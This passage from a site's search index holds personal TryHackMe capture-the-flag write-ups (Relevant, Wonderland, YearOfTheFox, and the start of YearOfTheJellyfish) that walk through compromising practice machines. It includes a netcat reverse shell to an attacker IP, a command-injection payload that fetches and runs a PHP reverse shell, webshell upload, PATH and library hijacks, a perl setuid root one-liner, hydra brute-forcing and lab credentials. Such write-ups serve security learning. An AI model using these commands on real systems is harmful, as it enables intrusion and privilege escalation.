builtin group memberships:\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n ======================================================================== \n|    Users on &lt;MACHINE_IP&gt; via RID cycling (RIDS: 500-550,1000-1050)    |\n ======================================================================== \n[I] Found new SID: S-1-5-21-3981879597-1135670737-2718083060\n[I] Found new SID: S-1-5-82-3876422241-1344743610-1729199087-774402673\n[I] Found new SID: S-1-5-82-3006700770-424185619-1745488364-794895919\n[I] Found new SID: S-1-5-82-271721585-897601226-2024613209-625570482\n[I] Found new SID: S-1-5-82-2094419441-2301267808-272098454-1219398644\n[I] Found new SID: S-1-5-80-3139157870-2983391045-3678747466-658725712\n[I] Found new SID: S-1-5-80\n[I] Found new SID: S-1-5-32\n[+] Enumerating users using SID S-1-5-32 and logon username 'guest', password ''\nS-1-5-32-544 BUILTIN\\Administrators (Local Group)\nS-1-5-32-545 BUILTIN\\Users (Local Group)\nS-1-5-32-546 BUILTIN\\Guests (Local Group)\nS-1-5-32-547 BUILTIN\\Power Users (Local Group)\nS-1-5-32-550 BUILTIN\\Print Operators (Local Group)\n</code></pre></p> <p>Lets check that <code>nt4wrksv</code> share: <code>smbclient -N //&lt;MACHINE_IP&gt;/nt4wrksv</code>. Once connected I found a file called <code>passwords.txt</code> cool: <pre><code>[User Passwords - Encoded]\nQm9iIC0gIVBAJCRXMHJEITEyMw==\nQmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk\n</code></pre></p> <p>Looks like <code>base64</code> lets get them in clear:</p> <pre><code>Bob - !P@$$W0rD!123\nBill - Juw4nnaM4n420696969!$$$\n</code></pre> <p>I tried the passwords but no luck, maybe they are valid usernames but the passwords are useless, lets check the web page.</p>"},{"location":"TryHackMe%21/Relevant/#httpmachine_ip","title":"http://MACHINE_IP/","text":"<p><code>gobuster</code> couldn't find anything and <code>nikto</code> only reported the <code>TRACE</code> method i commented earlier as something \"interesting\" so lets check the other page.</p>"},{"location":"TryHackMe%21/Relevant/#httpmachine_ip49663","title":"http://MACHINE_IP:49663/","text":"<p><code>nikto</code> only reported the <code>TRACE</code> method again but <code>gobuster</code> reported <code>/nt4wrksv</code> path, the same as the SMB share. Maybe it is connected to it? I tried the path <code>/nt4wrksv/passwords.txt</code> and the page showed the file content, ok nice.</p>"},{"location":"TryHackMe%21/Relevant/#exploiting","title":"Exploiting","text":""},{"location":"TryHackMe%21/Relevant/#rce","title":"RCE","text":"<p>We have access to that share so... can we get a RCE? I uploaded <code>cmdasp.aspx</code> and there it was, allowing me to execute commands nice.</p> <p>Now I will try to upload <code>nc.exe</code> to the share and get a proper reverse shell.</p>"},{"location":"TryHackMe%21/Relevant/#reverse-shell","title":"Reverse shell!","text":"<p>First I had to find the directory, I was pretty lucky and I found it fast: <pre><code>dir C:\\inetpub\\wwwroot\\nt4wrksv\n</code></pre> There it is, nc.exe. Lest try <code>nc.exe -e cmd.exe &lt;Attacker_IP&gt; &lt;PORT&gt;</code> with a netcat listener in our site. After some try and error I tried with the port 443 to avoid possible firewalls aaaand the shell came back cool.</p>"},{"location":"TryHackMe%21/Relevant/#user-flag","title":"User flag","text":"<p>The user flag was in Bob directory. Just execute <code>more C:\\Users\\Bob\\Desktop\\user.txt</code>: <pre><code>THM{*******************************}\n</code></pre></p>"},{"location":"TryHackMe%21/Relevant/#privesc","title":"Privesc","text":"<p>I tried to execute <code>winpeas</code> to check for privesc vectors but to be honest wasn't a good idea. I don't know why but this box is really slow sometimes and it hanged. Sooo i tried some manual enumeration:</p> <pre><code>whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State   \n============================= ========================================= ========\nSeAssignPrimaryTokenPrivilege Replace a process level token             Disabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled\nSeAuditPrivilege              Generate security audits                  Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \nSeImpersonatePrivilege        Impersonate a client after authentication Enabled &lt;----\nSeCreateGlobalPrivilege       Create global objects                     Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set            Disabled\n</code></pre> <p>That <code>SeImpersonatePrivilege</code> thing looks interesting, after searching a bit i found this exploit: https://github.com/itm4n/PrintSpoofer. I uploaded it to the machine and executed it:</p> <pre><code>C:\\inetpub\\wwwroot\\nt4wrksv&gt;PrintSpoofer.exe -i -c cmd\nPrintSpoofer.exe -i -c cmd\n[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;\n</code></pre> <p>And yep, a <code>system</code> shell cool.</p>"},{"location":"TryHackMe%21/Relevant/#root-flag","title":"Root flag","text":"<p>Just execute <code>more C:\\Users\\Administrator\\Desktop\\root.txt</code>: <pre><code>THM{*******************************}\n</code></pre></p>"},{"location":"TryHackMe%21/Wonderland/","title":"Wonderland","text":"<p>Link to the room</p>"},{"location":"TryHackMe%21/Wonderland/#nmap-scan","title":"Nmap scan","text":"<pre><code># Nmap 7.91 scan initiated Mon Mar  8 11:54:32 2021 as: nmap -sC -sV -oN nmap.txt 10.10.176.220\nNmap scan report for 10.10.176.220\nHost is up (0.082s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)\n|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)\n|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)\n80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)\n|_http-title: Follow the white rabbit.\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Mon Mar  8 11:54:54 2021 -- 1 IP address (1 host up) scanned in 21.96 seconds\n</code></pre>"},{"location":"TryHackMe%21/Wonderland/#gobuster-scan","title":"Gobuster scan","text":"<p>I noticed that maybe that <code>r</code> directory could end up forming a word so i started scanning:</p> <pre><code>===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.176.220/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2021/03/08 11:57:50 Starting gobuster\n===============================================================\n/img (Status: 301)\n/r (Status: 301)\n===============================================================\n2021/03/08 11:59:29 Finished\n===============================================================\n</code></pre> <pre><code>===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.176.220/r\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2021/03/08 12:00:12 Starting gobuster\n===============================================================\n/a (Status: 301)\n===============================================================\n2021/03/08 12:01:10 Finished\n===============================================================\n</code></pre> <p>At the end, the url looks like form \"rabbit\": http://10.10.176.220/r/a/b/b/i/t/</p>"},{"location":"TryHackMe%21/Wonderland/#looking-around-the-rabbit-hole","title":"Looking around the rabbit hole","text":"<p>After getting into http://10.10.176.220/r/a/b/b/i/t/ and inspecting the page i found a hidden p tag with this in it:</p> <pre><code>alice:HowDothTheLittleCrocodileImproveHisShiningTail\n</code></pre> <p>Maybe ssh password (?)</p>"},{"location":"TryHackMe%21/Wonderland/#ssh-access","title":"SSH access","text":""},{"location":"TryHackMe%21/Wonderland/#alice","title":"alice","text":"<p>Well looks like it is. I could get access to the machine through ssh using the above credentials yeah!</p> <p>Ok in <code>/home/alice</code> directory i found <code>root.txt</code> and <code>walrus_and_the_carpenter.py</code>. That last python file can be executed as the user <code>rabbit</code>. It just print random lines of a poem.</p> <pre><code>alice@wonderland:~$ sudo -l\nMatching Defaults entries for alice on wonderland:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser alice may run the following commands on wonderland:\n    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\n</code></pre> <p>The file have the next line <code>import random</code> which is a relative path so... i think we can work with that. I just wrote a little fake <code>random.py</code> file with the next content:</p> <pre><code>import pty\n\ndef choice(something_about_a_poem):\n        pty.spawn(\"/bin/bash\")\n        exit()\n</code></pre> <p>Executing <code>walrus_and_the_carpenter.py</code> now as <code>sudo -l</code> showed, will execute our fake random module and give us access to <code>rabbit</code> user:</p> <pre><code>alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py\nrabbit@wonderland:~$ \n</code></pre>"},{"location":"TryHackMe%21/Wonderland/#rabbit","title":"rabbit","text":"<p>I like to run <code>HOME=/home/$USER</code> to have the right user home directory configured in the shell.</p> <p>Looks like <code>rabbit</code> has access to a SUID executable: <code>teaParty</code>. It ask you for something nice but just core dump for some reason.</p> <p>I decided to download the file to my machine so i just passed the file to <code>alice</code> and download it. It is not stripped so that is cool for looking inside hehe</p> <p>Ok this is funny:</p> <pre><code>void main(void)\n\n{\n  setuid(0x3eb);\n  setgid(0x3eb);\n  puts(\"Welcome to the tea party!\\nThe Mad Hatter will be here soon.\");\n  system(\"/bin/echo -n \\'Probably by \\' &amp;&amp; date --date=\\'next hour\\' -R\");\n  puts(\"Ask very nicely, and I will give you some tea while you wait for him\");\n  getchar();\n  puts(\"Segmentation fault (core dumped)\");\n  return;\n}\n</code></pre> <p>First the program just print the core dumped error, lmao. Second, it set the uid to 1003 (probably the <code>hatter</code> user).</p> <p>I can see that the program uses the command <code>date</code> inside the <code>system</code> function with a relative PATH. Adding <code>/home/rabbit</code> to <code>rabbit</code> PATH: <code>PATH=\"$HOME:$PATH\"</code> and creating <code>date</code> script in it with something... funny in it will do i think. (Remember to execute <code>chmod a+x date</code> to allow the system to run the script)</p> <p>Lets try it, this is my <code>date</code> script:</p> <pre><code>#! /bin/sh\n\nbash -p\n</code></pre> <p>And...</p> <pre><code>rabbit@wonderland:~$ ./teaParty \nWelcome to the tea party!\nThe Mad Hatter will be here soon.\nProbably by hatter@wonderland:~$\n</code></pre> <p>Nice!</p>"},{"location":"TryHackMe%21/Wonderland/#hatter","title":"hatter","text":"<p>I found a <code>passwd.txt</code> in <code>hatter</code> home directory. It contain <code>WhyIsARavenLikeAWritingDesk?</code> that is hatter password so we got to a \"checkpoint\":</p> <p><code>hatter:WhyIsARavenLikeAWritingDesk?</code></p> <p>We can now conect to hatter account directly.</p> <p>Looks like the user flag is not here neither. Alice had the <code>root.txt</code> file in her directory, could be possible that we can just read <code>/root/user.txt</code> or something? In wonderland the things are a bit weird so lets try i dont know:</p> <pre><code>hatter@wonderland:~$ cat /root/user.txt\nthm{\"Curiouser and curiouser!\"}\n</code></pre> <p>So.. we got the user flag, nice (Totally on porpouse) lets go for the root one.</p> <p>After i while i decided to execute <code>linpeas</code> and i saw something interesting:</p> <pre><code>Files with capabilities:\n/usr/bin/perl5.26.1 = cap_setuid+ep\n/usr/bin/mtr-packet = cap_net_raw+ep\n/usr/bin/perl = cap_setuid+ep\n</code></pre> <p>Perl can manipulate the process UID so... lets try something:</p> <pre><code>hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash -p\";'\nroot@wonderland:~# \n</code></pre> <p>Jackpot! We are root, lets get that root flag with <code>cat /home/alice/root.txt</code>:</p> <p><code>thm{Twinkle, twinkle, little bat! How I wonder what you\u2019re at!}</code></p>"},{"location":"TryHackMe%21/YearOfTheFox/","title":"YearOfTheFox","text":"<p>Link to the room</p>"},{"location":"TryHackMe%21/YearOfTheFox/#enumeration","title":"Enumeration","text":"<p>Let's start checking for open ports:</p> <pre><code>------------------------------------------------------------\n        Threader 3000 - Multi-threaded Port Scanner          \n                       Version 1.0.7                    \n                   A project by The Mayor               \n------------------------------------------------------------\nEnter your target IP address or URL here: &lt;MACHINE_IP&gt;\n------------------------------------------------------------\nScanning target &lt;MACHINE_IP&gt;\nTime started: 2021-05-20 11:21:53.011113\n------------------------------------------------------------\nPort 80 is open\nPort 139 is open\nPort 445 is open\nPort scan completed in 0:00:19.643396\n------------------------------------------------------------\n</code></pre> <p>And now a typical <code>nmap</code> scan:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nmap -p80,139,445 -sV -sC &lt;MACHINE_IP&gt;                    \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-20 11:23 EDT\nNmap scan report for &lt;MACHINE_IP&gt;\nHost is up (0.049s latency).\n\nPORT    STATE SERVICE     VERSION\n80/tcp  open  http        Apache httpd 2.4.29\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=You want in? Gotta guess the password!\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: 401 Unauthorized\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YEAROFTHEFOX)\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: YEAROFTHEFOX)\nService Info: Hosts: year-of-the-fox.lan, YEAR-OF-THE-FOX\n\nHost script results:\n|_clock-skew: mean: -19m55s, deviation: 34m37s, median: 3s\n|_nbstat: NetBIOS name: YEAR-OF-THE-FOX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: year-of-the-fox\n|   NetBIOS computer name: YEAR-OF-THE-FOX\\x00\n|   Domain name: lan\n|   FQDN: year-of-the-fox.lan\n|_  System time: 2021-05-20T16:24:02+01:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-20T15:24:01\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.01 seconds\n</code></pre> <p>So a webpage and Samba, let's check them out. The webpage ask for a password so i will just check that Samba server instead.</p>"},{"location":"TryHackMe%21/YearOfTheFox/#samba","title":"Samba","text":"<p><pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ enum4linux &lt;MACHINE_IP&gt;         \nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu May 20 11:43:36 2021\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... &lt;MACHINE_IP&gt;\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ===================================================== \n|    Enumerating Workgroup/Domain on &lt;MACHINE_IP&gt;    |\n ===================================================== \n[+] Got domain/workgroup name: YEAROFTHEFOX\n\n ============================================= \n|    Nbtstat Information for &lt;MACHINE_IP&gt;    |\n ============================================= \nLooking up status of &lt;MACHINE_IP&gt;\n    YEAR-OF-THE-FOX &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service\n    YEAR-OF-THE-FOX &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service\n    YEAR-OF-THE-FOX &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service\n    ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser\n    YEAROFTHEFOX    &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name\n    YEAROFTHEFOX    &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser\n    YEAROFTHEFOX    &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections\n\n    MAC Address = 00-00-00-00-00-00\n\n ====================================== \n|    Session Check on &lt;MACHINE_IP&gt;    |\n ====================================== \n[+] Server &lt;MACHINE_IP&gt; allows sessions using username '', password ''\n\n ============================================ \n|    Getting domain SID for &lt;MACHINE_IP&gt;    |\n ============================================ \nDomain Name: YEAROFTHEFOX\nDomain Sid: (NULL SID)\n[+] Can't determine if host is part of domain or part of a workgroup\n\n ======================================= \n|    OS information on &lt;MACHINE_IP&gt;    |\n ======================================= \nUse of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.\n[+] Got OS info for &lt;MACHINE_IP&gt; from smbclient: \n[+] Got OS info for &lt;MACHINE_IP&gt; from srvinfo:\n    YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)\n    platform_id     :   500\n    os version      :   6.1\n    server type     :   0x809a03\n\n ============================== \n|    Users on &lt;MACHINE_IP&gt;    |\n ============================== \nindex: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox  Name: fox   Desc: \n\nuser:[fox] rid:[0x3e8]\n\n ========================================== \n|    Share Enumeration on &lt;MACHINE_IP&gt;    |\n ========================================== \n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    yotf            Disk      Fox's Stuff -- keep out!\n    IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))\nSMB1 disabled -- no workgroup available\n\n[+] Attempting to map shares on &lt;MACHINE_IP&gt;\n//&lt;MACHINE_IP&gt;/yotf Mapping: DENIED, Listing: N/A\n//&lt;MACHINE_IP&gt;/IPC$ [E] Can't understand response:\nNT_STATUS_OBJECT_NAME_NOT_FOUND listing \\*\n\n ===================================================== \n|    Password Policy Information for &lt;MACHINE_IP&gt;    |\n ===================================================== \n\n\n[+] Attaching to &lt;MACHINE_IP&gt; using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n[+] Found domain(s):\n\n    [+] YEAR-OF-THE-FOX\n    [+] Builtin\n\n[+] Password Info for Domain: YEAR-OF-THE-FOX\n\n    [+] Minimum password length: 5\n    [+] Password history length: None\n    [+] Maximum password age: 37 days 6 hours 21 minutes \n    [+] Password Complexity Flags: 000000\n\n        [+] Domain Refuse Password Change: 0\n        [+] Domain Password Store Cleartext: 0\n        [+] Domain Password Lockout Admins: 0\n        [+] Domain Password No Clear Change: 0\n        [+] Domain Password No Anon Change: 0\n        [+] Domain Password Complex: 0\n\n    [+] Minimum password age: None\n    [+] Reset Account Lockout Counter: 30 minutes \n    [+] Locked Account Duration: 30 minutes \n    [+] Account Lockout Threshold: None\n    [+] Forced Log off Time: 37 days 6 hours 21 minutes \n\n\n[+] Retieved partial password policy with rpcclient:\n\nPassword Complexity: Disabled\nMinimum Password Length: 5\n\n\n =============================== \n|    Groups on &lt;MACHINE_IP&gt;    |\n =============================== \n\n[+] Getting builtin groups:\n\n[+] Getting builtin group memberships:\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n ======================================================================== \n|    Users on &lt;MACHINE_IP&gt; via RID cycling (RIDS: 500-550,1000-1050)    |\n ======================================================================== \n[I] Found new SID: S-1-22-1\n[I] Found new SID: S-1-5-21-978893743-2663913856-222388731\n[I] Found new SID: S-1-5-32\n[+] Enumerating users using SID S-1-22-1 and logon username '', password ''\nS-1-22-1-1000 Unix User\\fox (Local User)\nS-1-22-1-1001 Unix User\\rascal (Local User)\n</code></pre> Ok, interesting things: a share called <code>yotf</code> and also some system users: <code>fox</code> and <code>rascal</code>. Looks like i can't really get nothing more so maybe we can try to brutefoce. I will start with the webpage because im more use to this kind of attacks in web.</p>"},{"location":"TryHackMe%21/YearOfTheFox/#webpage","title":"Webpage","text":"<p>I used <code>hydra</code> to try to bruteforce the password for the users i found earlier: <code>hydra -l &lt;USER&gt; -P rockyou.txt -s 80 -f &lt;MACHINE_IP&gt; http-get /</code>. I didn't get something useful with the <code>fox</code> user but <code>rascal</code> in the other hand had an easy password to guess using <code>rockyou</code>: <code>rascal:****</code> cool.</p> <p>Now we can access the webpage: 'Rascal's Search System'. I tried to search something random and the page said 'file not found', i tried a <code>.</code> and got the files in the current directory:</p> <pre><code>creds2.txt\nfox.txt\nimportant-data.txt\n</code></pre> <p>The text box will delete <code>/</code> or any other 'bad' characters using javascript, i guess i can just bypass that making a POST request directly to <code>/assets/php/search.php</code>. I wrote a python script for it, and after a lot of time i got RCE: <code>\\\"; ping &lt;ATACKER_IP&gt;; \\\"</code>. Using <code>sudo tcpdump -i tun0 -n</code> i could check that the ping request arrived to my machine.</p>"},{"location":"TryHackMe%21/YearOfTheFox/#reverse-shell","title":"Reverse shell","text":"<p>Looks like the backend is filtering characters too so getting a reverse shell was a bit hard but after a while i got this payload to work:</p> <pre><code>\"\\\"; wget -O - -q http://&lt;ATACKER_IP&gt;:8000/php-reverse-shell.php | php; \\\"\"\n</code></pre> <p>This will connect to my machine in the port 8000, get a php reverse shell and then pipe the php code into the <code>php</code> command. Using that i was able to get a shell.</p> <p>To get the flag just:</p> <pre><code>www-data@year-of-the-fox:/$ cat /var/www/web-flag.txt\nTHM{*********************************}\n</code></pre> <p>And also i will get the files content we saw before:</p> <pre><code>creds2.txt\nLF5GGMCNPJIXQWLKJEZFURCJGVMVOUJQJVLVE2CONVHGUTTKNBWVUV2WNNNFOSTLJVKFS6CNKRAX\nUTT2MMZE4VCVGFMXUSLYLJCGGM22KRHGUTLNIZUE26S2NMFE6R2NGBHEIY32JVBUCZ2MKFXT2CQ=\n</code></pre> <p>The rest of the files are empty. By the way the file content looks like junk.</p>"},{"location":"TryHackMe%21/YearOfTheFox/#privesc","title":"Privesc","text":""},{"location":"TryHackMe%21/YearOfTheFox/#user","title":"User","text":"<p>After some digging, i decided to use <code>linpeas</code> and check if i can see something interesting. This is what caught my attention:</p> <pre><code>[+] Active Ports\n[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -  &lt;---                 \ntcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::445                  :::*                    LISTEN      -                   \ntcp6       0      0 :::139                  :::*                    LISTEN      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      - \n\n[+] Searching ssl/ssh files\nListenAddress 127.0.0.1 \nChallengeResponseAuthentication no\n --&gt; /etc/hosts.allow file found, read the rules:\n/etc/hosts.allow\n\n\nSearching inside /etc/ssh/ssh_config for interesting info\nHost *\n    SendEnv LANG LC_*\n    HashKnownHosts yes\n    GSSAPIAuthentication yes\n</code></pre> <p>Is that <code>ssh</code> only in localhost?</p> <pre><code>www-data@year-of-the-fox:/tmp$ netstat -tulp | grep ssh\n(Not all processes could be identified, non-owned process info\n will not be shown, you would have to be root to see it all.)\ntcp        0      0 localhost:ssh           0.0.0.0:*               LISTEN      -  \n</code></pre> <p>Yep, it is. Also inside the <code>/etc/ssh/ssh_config</code> i can see that only the user <code>fox</code> is allowed to connect through it. To get access to this service from our machine i will use <code>socat</code> to open a port in the remote machine and i will forward it to the port 22:</p> <pre><code>/tmp/socat tcp-listen:8080,reuseaddr,fork tcp:localhost:22\n</code></pre> <p>After executing that the <code>ssh</code> service is available in the port 8080 of the target machine. I will try to brute force it with <code>hydra</code>:</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ hydra -l fox -P ~/rockyou.txt &lt;MACHINE_IP&gt; -s 8080 -t 4 ssh\nHydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-20 16:24:28\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task\n[DATA] attacking ssh://&lt;MACHINE_IP&gt;:8080/\n[STATUS] 44.00 tries/min, 44 tries in 00:01h, 14344355 to do in 5433:29h, 4 active\n[8080][ssh] host: &lt;MACHINE_IP&gt;   login: fox   password: ******\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-20 16:27:24\n</code></pre> <p>The credentials are <code>fox:*****</code>. To get the flag just execute: <pre><code>fox@year-of-the-fox:~$ cat /home/fox/user-flag.txt \nTHM{*********************************}\n</code></pre></p>"},{"location":"TryHackMe%21/YearOfTheFox/#root","title":"Root","text":"<p>I checked the samba folder but nothing worth in there. I tried the typical <code>sudo -l</code> command to check if the user can use something interesting with <code>sudo</code> and this is what i got:</p> <pre><code>fox@year-of-the-fox:~$ sudo -l\nMatching Defaults entries for fox on year-of-the-fox:\n    env_reset, mail_badpass\n\nUser fox may run the following commands on year-of-the-fox:\n    (root) NOPASSWD: /usr/sbin/shutdown\n</code></pre> <p>That <code>shutdown</code> binary could be interesting, let's check it out. I used <code>strings</code> to check if i can see something interesting and i saw that the binary use something called <code>poweroff</code> and use a relative <code>PATH</code> lets abuse that.</p> <p>First i will execute <code>export PATH=\"$HOME:$PATH\"</code> to add the user home folder to the <code>PATH</code> and i will create a script called <code>poweroff</code> in there:</p> <pre><code>#!/bin/bash\n\nid\nexit\n</code></pre> <p>This way this script will run instead of the proper binary. Let's try this PoC:</p> <pre><code>fox@year-of-the-fox:~$ shutdown \nuid=1000(fox) gid=1000(fox) groups=1000(fox),114(sambashare)\nfox@year-of-the-fox:~$ sudo shutdown \nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>Cool, it worked. Let's edit the <code>poweroff</code> script a bit to get something more interesting:</p> <pre><code>#!/bin/bash\n\nbash\nexit\n</code></pre> <p><pre><code>fox@year-of-the-fox:~$ sudo shutdown \nroot@year-of-the-fox:~#\n</code></pre> An we are now root nice, let's get that root flag and...</p> <pre><code>root@year-of-the-fox:/home/rascal# cat /root/root.txt \nNot here -- go find!\n</code></pre> <p>Really? Ok so let's check the rascal user home folder:</p> <pre><code>root@year-of-the-fox:/home/rascal# ls -a\n.  ..  .bash_history  .bash_logout  .bashrc  .did-you-think-I-was-useless.root  .profile\n</code></pre> <p>There you are!</p> <pre><code>root@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root \nT\nH\nM\n{*******\n********\n********\n********\n\nHere's the prize:\n\nYTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw\nMwo=\n\nGood luck!\n</code></pre> <p>The base64 thing... i don't really know what it is to be honest.</p>"},{"location":"TryHackMe%21/YearOfTheJellyfish/","title":"YearOfTheJellyfish","text":""},{"location":"TryHackMe%21/YearOfTheJellyfish/#lets-start-enumerating","title":"Let's start enumerating","text":"<p>First as always i ran <code>nmap</code> to check for open ports:</p> <pre><code># Nmap 7.91 scan initiated Sat Apr 24 12:30:03 2021 as: nmap -sC -sV -oN nmapScan.txt &lt;MACHINE_IP&gt;\nNmap scan report for ec2-&lt;MACHINE_IP&gt;.eu-west-1.compute.amazonaws.com (&lt;MACHINE_IP&gt;)\nHost is up (0.043s latency).\nNot shown: 995 filtered ports\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      vsftpd 3.0.3\n22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)\n80/tcp   open  http     Apache httpd 2.4.29\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Did not follow redirect to https://robyns-petshop.thm/\n443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Robyn&amp;#039;s Pet Shop\n| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB\n| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm\n| Not valid before: 2021-04-24T16:24:05\n|_Not valid after:  2022-04-24T16:24:05\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n8000/tcp open  http-alt\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Length: 15\n|_    Request\n|_http-title: Under Development!\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.91%I=7%D=4/24%Time=608447AD%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,3F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Length:\\x2\nSF:015\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nService Info: Host: robyns-petshop.thm; 